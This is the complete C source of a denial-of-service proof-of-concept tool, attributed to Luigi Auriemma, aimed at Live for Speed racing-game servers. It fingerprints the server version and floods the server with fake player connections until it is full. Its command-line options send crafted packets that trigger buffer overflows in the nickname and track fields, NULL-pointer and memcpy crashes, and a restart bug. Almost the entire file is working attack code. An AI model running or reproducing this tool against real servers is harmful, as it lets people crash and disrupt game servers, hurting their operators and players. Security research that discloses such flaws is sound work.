/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include "lfscrc.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
    #include <pthread.h>

    #define ONESEC  1
    #define stristr strcasestr
#endif

#ifdef WIN32
    #define quick_thread(NAME, ARG) DWORD WINAPI NAME(ARG)
    #define thread_id   DWORD
#else
    #define quick_thread(NAME, ARG) void *NAME(ARG)
    #define thread_id   pthread_t
#endif

thread_id quick_threadx(void *func, void *data) {
    thread_id       tid;
#ifdef WIN32
    if(!CreateThread(NULL, 0, func, data, 0, &tid)) return(0);
#else
    pthread_attr_t  attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    if(pthread_create(&tid, &attr, func, data)) return(0);
#endif
    return(tid);
}



#define VER             "0.2.3"
#define BUFFSZ          0xff
#define PORT            63392
#define MAXSOCK         128
#define WAITSEC         5
#define TIMEOUT         30

typedef uint8_t         u8;
typedef uint16_t        u16;
typedef uint32_t        u32;



quick_thread(client, void);
u32 lfs_crc32(u32 crc_start, unsigned char *data, int size);
int lfs_account_password(u8 *dest, u8 *pass);
int getxx(u8 *data, u32 *ret, int bits);
int putxx(u8 *data, u32 num, int bits);
int putcc(u8 *data, int chr, int len);
int putmm(u8 *data, u8 *src, int len);
int putss(u8 *data, u8 *src, int len);
int getmm(u8 *data, u8 **dst, int len);
int putrr(u8 *data, int len);
int lfs_ver(u8 *dest, u8 *ver);
int send_lfs(int sock, u8 *data, int len);
int recv_lfs(int sock, u8 *buff);
int connetti(void);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



struct  linger  ling = {1,1};
struct sockaddr_in  peer;
u_int   seed        = 0;
int     ready,
        full,
        disc,
        srvbuild    = 0,
        attack      = 0,
        demo        = 0,    // note that this tool uses a lot of work-arounds for working
        onlyone     = 0;
u8      ver[8],             // on more versions... so if this code sux it's normal
        *password   = "",
        *myusername = NULL,
        *mypassword = NULL;



int main(int argc, char *argv[]) {
    int     sd,
            i,
            len,
            received;
    u16     port    = PORT;
    u8      buff[BUFFSZ],
            maj,
            min,
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Live for Speed Fake Players DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s [options] <host>\n"
            "\n"
            "Options:\n"
            "-p PORT  port used by the server (%hu)\n"
            "-w PASS  specify the server's password\n"
            "-v VER   version to use (automatically scanned)\n"
            "-b NUM   build number (automatically scanned)\n"
            "-o       only one player (debug)\n"
            "-u U P   specify the username U and password P for internet servers\n"
            "         if the password starts with 0x will be considered the raw 6 bytes\n"
            "\n"
            "Bugs affecting versions <= 0.5X10:\n"
            "-1       in-game nickname's buffer-overflow with packet ID 3\n"
            "-2       in-game crash (track's buffer-overflow) with packet ID 10\n"
            "-3       NULL pointer crash versus internet and hidden S1/S2 servers\n"
            "-4       memcpy() crash versus internet S1/S2 servers\n"
            "-5       emergency restart bug <= Z13\n"
            "\n"
            "Note: this tool works only versus demo servers (except where is written\n"
            "      differently) but with some small modifications could work versus\n"
            "      other versions (S1/S2) too\n"
            "\n", argv[0], port);
        exit(1);
    }

    *ver = 0;

    argc--;
    for(i = 1; i < argc; i++) {
        switch(argv[i][1]) {
            case 'p': port      = atoi(argv[++i]);          break;
            case 'w': password  = argv[++i];                break;
            case 'v': strncpy(ver, argv[++i], sizeof(ver)); break;
            case 'b': srvbuild  = atoi(argv[++i]);          break;
            case 'o': onlyone   = 1;                        break;
            case 'u':
                myusername      = argv[++i];
                mypassword      = argv[++i];
                break;
            case '1': attack    = 1;                        break;
            case '2': attack    = 2;                        break;
            case '3': attack    = 3;                        break;
            case '4': attack    = 4;                        break;
            case '5': attack    = 5;                        break;
            default: {
                printf("\nError: wrong command-line argument (%s)\n\n", argv[i]);
                exit(1);
                } break;
        }
    }

    host = argv[argc];
    p = strchr(host, ':');
    if(p) {
        *p = 0;
        port = atoi(p + 1);
    }

    peer.sin_addr.s_addr = resolv(host);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    seed = time(NULL) * peer.sin_addr.s_addr * peer.sin_port;

    buff[0] = 0;
    if(!ver[0]) {
        printf("- get server version:\n");

        sd = connetti();
        received = 0;

        for(maj = 0; maj < 10; maj++) {
            for(min = 0; min < 10; ) {
                sprintf(ver, "%u.%u", maj, min);

                lfs_ver(buff, ver);
                putxx(buff + 4, 28, 8);         // 29
                putxx(buff + 5, 0, 8);          // not needed
                putxx(buff + 8, 0, 32);

                if(send_lfs(sd, buff, 12) < 0) std_err();
                len = recv_lfs(sd, buff);
                if(len < 0) {
                    if(!received) {
                        buff[0] = 0;
                        goto ver_found;
                    }
                    // printf("- connection lost\n");
                    close(sd);
                    sd = connetti();
                    received = 0;
                    continue;
                    // goto ver_found;          // std_err();
                }

                received += len;
                printf("\t%u.%u.%-5d = %s\n", maj, min, srvbuild, buff);

                if(stristr(buff, "differ")) {
                    min++;
                } else if(!strchr(buff, '.')) {
                    srvbuild++;
                } else {
                    goto ver_found;
                }
            }
        }

ver_found:
        close(sd);

        p = strchr(buff, '.');
        if(!p) {
            for(;;) {
                sd = connetti();

                srvbuild++;
                lfs_ver(buff, ver);
                putxx(buff + 4, 28, 8);         // 29
                putxx(buff + 5, 0, 8);          // not needed
                putxx(buff + 8, 0, 32);
                if(send_lfs(sd, buff, 12) < 0) std_err();
                len = recv_lfs(sd, buff);
                close(sd);
                if((len >= 0) && strchr(buff, '.')) break;
            }
        }

        p = strchr(buff, '.');
        if(!p) {
            printf("\n"
                "Error: no version found, use the -v option. reply received:\n"
                "       %s\n"
                "\n", buff);
            exit(1);
        }
        sprintf(ver, "%u.%u%c%s", maj, min, p[2], p + 3);
        printf("\n- set version:   %s (%d)\n", ver, srvbuild);

        sd = connetti();

        lfs_ver(buff, ver);
        putxx(buff + 4, 29, 8);     // 29
        putxx(buff + 5, 1, 8);      // 1
        putxx(buff + 8, 0, 32);

        send_lfs(sd, buff, 12);
        len = recv_lfs(sd, buff);
        if(len < 0) {
            printf("\nAlert: no info received\n");
            goto ver_found;
        } else {
            if(stristr(buff, "Host is ")) goto ver_found;
            printf("\n"
                "- server name   %s\n"
                "- players       %u/%u\n",
                buff + 4,
                buff[0], buff[1]);
        }

        close(sd);
    }

    if(!srvbuild) {
        printf("- the build number is set to zero, in case of problems use -b\n");
    }

    printf("- start attack:\n");
    for(;;) {
        disc = 0;
        full = 0;

        for(i = 0; !full; i++) {
            printf("\n  Player: ");

            ready = 0;
            if(!quick_threadx(client, NULL)) {
                printf("\nError: unable to create new thread\n");
                exit(1);
            }

            while(!ready) sleep(ONESEC);    // all these sleep() are needed!
            sleep(ONESEC * 2);              // seems to exists a limit in LFS
        }

        if(i <= 1) {
            for(i = WAITSEC; i >= 0; i--) {
                printf("%3d\b\b\b", i);
                sleep(ONESEC);
            }
        } else {
            printf("\n"
                "- wait some seconds and then stop this tool\n"
                "  hopefully the server will restart or will be confused for a while\n");
            while(!disc) sleep(ONESEC);
        }
    }

    return(0);
}



quick_thread(client, void) {
    u32     chall,
            crc,
            num;
    int     i,
            sd,
            sdu,
            len;
    u8      buff[BUFFSZ],
            id,
            *p;

    sd = connetti();
    chall = 0;

    if(attack == 4) {
        lfs_ver(buff, ver);
        putxx(buff + 4, 29, 8);
        putxx(buff + 5, 5,  8);
        putxx(buff + 8, 0, 32);

        if(send_lfs(sd, buff, 12) < 0) goto end;

        len = recv_lfs(sd, buff);
        if(len < 0) goto end;

        printf("\n"
            "- malicious data sent, the tool now will continue normally if the server is\n"
            "  not vulnerable or will give an error if it's crashed\n");

        goto end;
    }

redo:
    for(;;) {
        lfs_ver(buff, ver);
        putxx(buff + 4, 29, 8);         // valid: 29
        if(!chall) {
            putxx(buff + 5, myusername ? 5 : 3,  8);     // valid: 3, 5 (internet auth)
        } else {
            putxx(buff + 5, 3,  8);
        }
        putxx(buff + 8, chall, 32);
        p = buff + 12;
        if(!chall) {
            if(!demo) {
                if(myusername) {              // username
                    p += putss(p, myusername, 24);
                } else {
                    p += putrr(p, 24);
                }
                if(attack == 3) p[23] = 0;  // yes, that's all!!!
                p += putcc(p, 0, 10);       // ???
                p += lfs_account_password(p, mypassword);
            }
        } else {
            p += putcc(p, 0, 8);
        }

        if(send_lfs(sd, buff, p - buff) < 0) goto end;
        len = recv_lfs(sd, buff);
        if(len < 0) goto end;

        if(len != 4) break;
        getxx(buff, &chall, 32);
        chall = lfscrc_pwd(chall, password);
    }

    if(len == 32) {
        printf("  %s\n", buff);
        if(stristr(buff, "full")) {
            full = 1;
        } else if(stristr(buff, "GAME password")) {
            printf("\nError: the authentication for the internet servers is not supported\n\n");
            exit(1);
        } else if(stristr(buff, "password")) {
            printf("\n- use the -w option for specifying the password\n\n");
            exit(1);
        } else if(!demo && stristr(buff, "Host is ")) {
            demo = 1;
            chall = 0;
            goto redo;
        } else {
            printf("\nError: %s\n", buff);
            exit(1);
        }
        goto end;
    }

    lfs_ver(buff, ver);
    putxx(buff + 4, 29, 8);
    putxx(buff + 5, 0,  8);
    putxx(buff + 8, 0, 32);
    p = buff + 12;
    if(!demo) {
        p += putrr(p, 8);
    }

    if(send_lfs(sd, buff, p - buff) < 0) goto end;
    len = recv_lfs(sd, buff);
    if(len < 0) goto end;

    sdu = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sdu < 0) std_err();
    setsockopt(sdu, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
    sendto(sdu, "LFS\0", 4, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));
    sleep(0);   // double sending is better
    sendto(sdu, "LFS\0", 4, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));
    close(sdu);

    len = recv_lfs(sd, buff);
    if(len < 0) goto end;

    getxx(buff + 12, &crc, 32);
    //lfscrc(buff, crc, 3);  // old method before version Z
    lfscrc2(buff, crc, 0, 1, 19, -1);   // version Z
    putxx(buff + 12, 0, 32);

    if(send_lfs(sd, buff, 16) < 0) goto end;
    len = recv_lfs(sd, buff);
    if(len < 0) goto end;
    if(stristr(buff, "don't match")) {
        printf("\nError: %s\n", buff);
        exit(1);
    }

    id = time(NULL);
    // LFS allows also invalid IDs
    do {
        p = buff;
        p += putxx(p, 1,  8);
        p += putxx(p, 22, 8);
        p += putxx(p, 0,  8);
        p += putxx(p, 0,  8);
        p += putxx(p, 0,  8);
        if(send_lfs(sd, buff, p - buff) < 0) goto end;
        len = recv_lfs(sd, buff);
        if(len < 0) goto end;
    } while(buff[0] != 19);
    id = buff[1];

    for(i = 0; i < 256; i++) {
        p = buff;
        p += putxx(p, 1,  8);
        p += putxx(p, 24, 8);
        p += putxx(p, id, 8);
        p += putxx(p, 0,  8);
        p += putxx(p, 0,  8);
        p += putrr(p, 24);          // nickname
        p += putrr(p, 8);           // plate

        if(send_lfs(sd, buff, p - buff) < 0) goto end;
        if(attack != 5) break;
    }
    len = recv_lfs(sd, buff);
    if(len < 0) goto end;

    if((attack == 1) || (attack == 2))  {
        printf("\n- test attack %d\n", attack);

        p = buff;
        p += putxx(p, 1,  8);
        p += putxx(p, (attack == 1) ? 3 : 10, 8);
        p += putxx(p, 0,  8);
        p += putxx(p, 0,  8);
        p += putxx(p, 0,  8);
        p += putcc(p, 'A', 250);    // 250 is the max allowed here

        if(send_lfs(sd, buff, p - buff) < 0) goto end;
        len = recv_lfs(sd, buff);
        if(len < 0) goto end;

        printf("\n"
            "- malicious data sent, the tool now will continue normally if the server is\n"
            "  not vulnerable or will give an error if it's crashed\n");
    }

    if(!onlyone) ready = 1;
    while((len = recv_lfs(sd, buff)) > 0) {
        if(!buff[0]) {
            getxx(buff + 1, &num, 16);

            p = buff;
            p += putxx(p, 0,    8);
            p += putxx(p, num,  16);
            p += putxx(p, -1,   16);
            if(len > 5) {
                // not implemented, gives "Sync Late"
                //p += putxx(p, 0x14, 8);     // full size of the data (0x14)
                //p += putxx(p, 0x2f, 8);     // index (max 0x56);
                //for(i = 0; i < 19; i++) { // first is the size of the data
                    //p += putxx(p, 0x00, 8);
                //}
            }

            if(send_lfs(sd, buff, p - buff) < 0) goto end;
        }

        if(disc) goto end;
    }
    disc = 1;

end:
    close(sd);
    if(onlyone) {
        printf("\n- done\n");
        exit(1);
    }
    if(!ready) ready = 1;
    return(0);
}



u32 lfs_crc32(u32 crc_start, unsigned char *data, int size) {
    static const u32    crctable[] = {
        0x00000000, 0x04c11db7, 0x09823b6e, 0x0d4326d9,
        0x130476dc, 0x17c56b6b, 0x1a864db2, 0x1e475005,
        0x2608edb8, 0x22c9f00f, 0x2f8ad6d6, 0x2b4bcb61,
        0x350c9b64, 0x31cd86d3, 0x3c8ea00a, 0x384fbdbd,
        0x4c11db70, 0x48d0c6c7, 0x4593e01e, 0x4152fda9,
        0x5f15adac, 0x5bd4b01b, 0x569796c2, 0x52568b75,
        0x6a1936c8, 0x6ed82b7f, 0x639b0da6, 0x675a1011,
        0x791d4014, 0x7ddc5da3, 0x709f7b7a, 0x745e66cd,
        0x9823b6e0, 0x9ce2ab57, 0x91a18d8e, 0x95609039,
        0x8b27c03c, 0x8fe6dd8b, 0x82a5fb52, 0x8664e6e5,
        0xbe2b5b58, 0xbaea46ef, 0xb7a96036, 0xb3687d81,
        0xad2f2d84, 0xa9ee3033, 0xa4ad16ea, 0xa06c0b5d,
        0xd4326d90, 0xd0f37027, 0xddb056fe, 0xd9714b49,
        0xc7361b4c, 0xc3f706fb, 0xceb42022, 0xca753d95,
        0xf23a8028, 0xf6fb9d9f, 0xfbb8bb46, 0xff79a6f1,
        0xe13ef6f4, 0xe5ffeb43, 0xe8bccd9a, 0xec7dd02d,
        0x34867077, 0x30476dc0, 0x3d044b19, 0x39c556ae,
        0x278206ab, 0x23431b1c, 0x2e003dc5, 0x2ac12072,
        0x128e9dcf, 0x164f8078, 0x1b0ca6a1, 0x1fcdbb16,
        0x018aeb13, 0x054bf6a4, 0x0808d07d, 0x0cc9cdca,
        0x7897ab07, 0x7c56b6b0, 0x71159069, 0x75d48dde,
        0x6b93dddb, 0x6f52c06c, 0x6211e6b5, 0x66d0fb02,
        0x5e9f46bf, 0x5a5e5b08, 0x571d7dd1, 0x53dc6066,
        0x4d9b3063, 0x495a2dd4, 0x44190b0d, 0x40d816ba,
        0xaca5c697, 0xa864db20, 0xa527fdf9, 0xa1e6e04e,
        0xbfa1b04b, 0xbb60adfc, 0xb6238b25, 0xb2e29692,
        0x8aad2b2f, 0x8e6c3698, 0x832f1041, 0x87ee0df6,
        0x99a95df3, 0x9d684044, 0x902b669d, 0x94ea7b2a,
        0xe0b41de7, 0xe4750050, 0xe9362689, 0xedf73b3e,
        0xf3b06b3b, 0xf771768c, 0xfa325055, 0xfef34de2,
        0xc6bcf05f, 0xc27dede8, 0xcf3ecb31, 0xcbffd686,
        0xd5b88683, 0xd1799b34, 0xdc3abded, 0xd8fba05a,
        0x690ce0ee, 0x6dcdfd59, 0x608edb80, 0x644fc637,
        0x7a089632, 0x7ec98b85, 0x738aad5c, 0x774bb0eb,
        0x4f040d56, 0x4bc510e1, 0x46863638, 0x42472b8f,
        0x5c007b8a, 0x58c1663d, 0x558240e4, 0x51435d53,
        0x251d3b9e, 0x21dc2629, 0x2c9f00f0, 0x285e1d47,
        0x36194d42, 0x32d850f5, 0x3f9b762c, 0x3b5a6b9b,
        0x0315d626, 0x07d4cb91, 0x0a97ed48, 0x0e56f0ff,
        0x1011a0fa, 0x14d0bd4d, 0x19939b94, 0x1d528623,
        0xf12f560e, 0xf5ee4bb9, 0xf8ad6d60, 0xfc6c70d7,
        0xe22b20d2, 0xe6ea3d65, 0xeba91bbc, 0xef68060b,
        0xd727bbb6, 0xd3e6a601, 0xdea580d8, 0xda649d6f,
        0xc423cd6a, 0xc0e2d0dd, 0xcda1f604, 0xc960ebb3,
        0xbd3e8d7e, 0xb9ff90c9, 0xb4bcb610, 0xb07daba7,
        0xae3afba2, 0xaafbe615, 0xa7b8c0cc, 0xa379dd7b,
        0x9b3660c6, 0x9ff77d71, 0x92b45ba8, 0x9675461f,
        0x8832161a, 0x8cf30bad, 0x81b02d74, 0x857130c3,
        0x5d8a9099, 0x594b8d2e, 0x5408abf7, 0x50c9b640,
        0x4e8ee645, 0x4a4ffbf2, 0x470cdd2b, 0x43cdc09c,
        0x7b827d21, 0x7f436096, 0x7200464f, 0x76c15bf8,
        0x68860bfd, 0x6c47164a, 0x61043093, 0x65c52d24,
        0x119b4be9, 0x155a565e, 0x18197087, 0x1cd86d30,
        0x029f3d35, 0x065e2082, 0x0b1d065b, 0x0fdc1bec,
        0x3793a651, 0x3352bbe6, 0x3e119d3f, 0x3ad08088,
        0x2497d08d, 0x2056cd3a, 0x2d15ebe3, 0x29d4f654,
        0xc5a92679, 0xc1683bce, 0xcc2b1d17, 0xc8ea00a0,
        0xd6ad50a5, 0xd26c4d12, 0xdf2f6bcb, 0xdbee767c,
        0xe3a1cbc1, 0xe760d676, 0xea23f0af, 0xeee2ed18,
        0xf0a5bd1d, 0xf464a0aa, 0xf9278673, 0xfde69bc4,
        0x89b8fd09, 0x8d79e0be, 0x803ac667, 0x84fbdbd0,
        0x9abc8bd5, 0x9e7d9662, 0x933eb0bb, 0x97ffad0c,
        0xafb010b1, 0xab710d06, 0xa6322bdf, 0xa2f33668,
        0xbcb4666d, 0xb8757bda, 0xb5365d03, 0xb1f740b4 };
    u32     crc = crc_start;
    int     i;

    if(size < 0) size = strlen(data);
    for(i = 0; i < size; i++) {
        crc = crctable[crc >> 24] ^ ((crc << 8) | data[i]);
    }
    return(crc);
}



int lfs_account_password(u8 *dest, u8 *pass) {
    int     i,
            n;
    u8      *p;

    p = dest;
    if(pass) {
        if(!strnicmp(pass, "0x", 2)) {
            for(i = 0; i < 6; i++) {
                pass += 2;
                sscanf(pass, "%02x", &n);
                *p++ = n;
            }
        } else {
            n = seed & 0xffff;
            p += putxx(p, n, 16);
            p += putxx(p, lfs_crc32(n, pass, -1), 32);
        }
    } else {
        p += putxx(p, 0, 16);
        p += putxx(p, 0, 32);
    }
    return(p - dest);
}



int getxx(u8 *data, u32 *ret, int bits) {
    u32     num;
    int     i,
            bytes;

    bytes = bits >> 3;

    for(num = i = 0; i < bytes; i++) {
        num |= (data[i] << (i << 3));
    }

    *ret = num;
    return(bytes);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = num >> (i << 3);
    }
    return(bytes);
}



int putcc(u8 *data, int chr, int len) {
    memset(data, chr, len);
    return(len);
}



int putmm(u8 *data, u8 *src, int len) {
    if(len < 0) {
        len = sprintf(data, "%s", src) + 1;
    } else {
        memcpy(data, src, len);
    }
    return(len);
}



int putss(u8 *data, u8 *src, int len) {
    strncpy(data, src, len);
    return(len);
}



int getmm(u8 *data, u8 **dst, int len) {
    *dst = data;
    if(len < 0) {
        len = strlen(data) + 1;
    }
    return(len);
}



int putrr(u8 *data, int size) {
    int     i,
            len;
    static const u8 table[] =
                "0123456789"
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz";

    len = seed % size;
    if(len < 3) len = 3;    // at least a minimum

    memset(data, 0, size);
    for(i = 0; i < len; i++) {
        seed = ((seed * 0x343FD) + 0x269EC3) >> 1;
        data[i] = table[seed % (sizeof(table) - 1)];
    }
    return(size);
}



int lfs_ver(u8 *dest, u8 *verx) {
    u32     build;
    int     v0, v1, v3;

    sscanf(verx, "%u.%u%c%u", &v0, &v1, &dest[2], &v3);
    dest[0] = v0;
    dest[1] = v1;
    dest[3] = v3;

    switch(dest[0]) {
        case 0:  build =     0; break;  // demo
        case 1:  build = 10000; break;  // S1
        case 2:  build = 20000; break;  // S2
        case 3:  build = 30000; break;  // S3
        default: {
            printf("\nError: unexistent build version (%d)\n", dest[0]);
            exit(1);
        }
    }
    build += srvbuild;

    *(u16 *)(dest + 6) = build;
    return(10);
}



int send_lfs(int sock, u8 *data, int len) {
    u8      buff[1 + BUFFSZ];

    buff[0] = len;
    memcpy(buff + 1, data, len);    // this is the fastest solution, really!!!
    len++;
    if(send(sock, buff, len, 0) != len) return(-1);
    fputc('.', stdout);
    return(0);
}



int recv_lfs(int sock, u8 *buff) {
    int     t;
    u8      len,
            size;

    if(timeout(sock, TIMEOUT) < 0) return(-1);
    if(recv(sock, &size, 1, 0) <= 0) return(-1);

    for(len = 0; len < size; len += t) {
        if(timeout(sock, TIMEOUT) < 0) return(-1);
        t = recv(sock, buff + len, size - len, 0);
        if(t <= 0) return(-1);
    }
    buff[len] = 0;  // useless except for some strings
    fputc('.', stdout);
    return(len);
}



int connetti(void) {
    int     sd;

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
    if(connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in))
      < 0) std_err();
    return(sd);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fdr;
    int     err;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fdr);
    FD_SET(sock, &fdr);
    err = select(sock + 1, &fdr, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


